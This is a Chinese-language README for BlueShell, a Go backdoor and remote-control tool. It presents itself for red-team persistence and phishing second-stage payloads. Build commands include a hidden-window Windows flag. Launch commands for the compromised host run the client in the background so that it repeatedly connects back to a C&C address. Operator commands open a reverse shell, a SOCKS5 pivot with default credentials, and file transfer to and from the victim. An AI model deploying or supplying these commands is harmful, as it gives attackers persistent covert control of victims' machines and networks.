BlueShell
===
BlueShell是一个Go语言编写的持续远控工具，拿下靶机后，根据操作系统版本下载部署对应的bsClient，其会每隔固定时间向指定的C&C地址发起反弹连接尝试，在C&C端运行bsServer即可连接bsClient，从而实现对靶机的持续控制，主要适用场景：
+ 红蓝对抗中的持久化后门或内网代理
+ 社工钓鱼二次加载Payload

目前支持的主要功能有：
+ 循环持续控制
+ 跨平台，支持Linux、Windows、MacOS
+ 交互式Shell反弹,Linux支持Tab补全、VIM、Ctrl+C等交互式操作，Windows只支持普通反弹Shell
+ Socks5代理反弹
+ 文件上传、下载
+ TLS通信加密

项目地址:https://github.com/whitehatnote/BlueShell

编译可执行文件
---

### Linux and MacOS
生成bsClient
```shell
go get github.com/armon/go-socks5
go get github.com/creack/pty
go get github.com/hashicorp/yamux

go build --ldflags "-s -w " -o bsClient client.go
```
生成bsServer
```shell
go get github.com/creack/pty
go get github.com/hashicorp/yamux
go get github.com/djimenez/iconv-go
go get golang.org/x/crypto/ssh/terminal

go build --ldflags "-s -w " -o bsServer server.go
```
### Windows
生成bsClient
```shell
go get github.com/armon/go-socks5
go get github.com/creack/pty
go get github.com/hashicorp/yamux

go build --ldflags "-s -w -H=windowsgui" -o bsClient.exe client.go
```

工具使用方法
---
### Client
在受控靶机上运行bsClient    
#### Windows靶机：    
默认配置模式启动
```shell
start /b bsClient.exe
```
参数模式启动,-h指定远控端地址，-p指定远控端监听端口,-t指定尝试连接远控的间隔秒数
```shell
start /b bsClient.exe -h 10.0.0.1 -p 443 -t 10
```
#### Linux and MacOS靶机:    
默认配置模式启动
```shell
nohup bsClient &
```
参数模式启动,-h指定远控端地址，-p指定远控端监听端口
```shell
nohup bsClient -h 10.0.0.1 -p 443 &
```
### C&C Server
远控端运行bsServer,需要是Linux机器,并且key目录与bsServer在相同根目录下,启动成功如下效果：
```
[root@host BluesShell]# ls -al
总用量 4148
drwxr-xr-x   3 root root    4096 6月  17 22:14 .
drwxrwxrwt. 10 root root   40960 6月  17 22:13 ..
-rwxr-xr-x   1 root root 4193320 6月  17 22:13 bsServer
drwxr-xr-x   2 root root    4096 6月  17 22:13 key
[root@host BluesShell]# ./bsServer
waiting for client connect...
```
#### Action:反弹shell
默认启动，远控监听8081端口，执行反弹shell操作
```shell
./bsServer
```
参数启动，-p指定远控监听443端口，-a指定执行反弹shell操作
```shell
./bsServer -p 443 -a shell
```
windows靶机的乱码问题解决,-rencode指定靶机的编码类型
```shell
./bsServer -rencode gb2312
```
#### Action:反弹Socks5代理
默认启动，远控监听8081端口，执行反弹socks操作，socks5的默认监听端口为7777，默认用户名blue，默认密码Blue@2020
```shell
./bsServer -a socks
```
参数启动，-p指定远控监听443端口，-a指定执行反弹socks操作,-sport指定socks监听的端口为7778，-suser指定socks代理的认证账号，-spass指定socks代理的认证密码
```shell
./bsServer -p 443 -a socks -sport 7778 -suser socksUser -spass socksPassword
```
#### Action:文件上传下载
上传本地文件到受控靶机，-lpath指定需要上传的本地文件路径，-rdir指定上传到的目录
```shell
./bsServer -a upload -lpath /tmp/tmp.txt -rdir c:\\
```
从受控靶机下载文件到本地，-rpath指定需要下载的文件地址，-ldir指定存放下载文件的本地路径
```shell
./bsServer -a upload -rpath c:\\tmp.txt -ldir /tmp
```

0x4. 参考
---
+ https://github.com/sysdream/hershell
+ https://github.com/creaktive/tsh
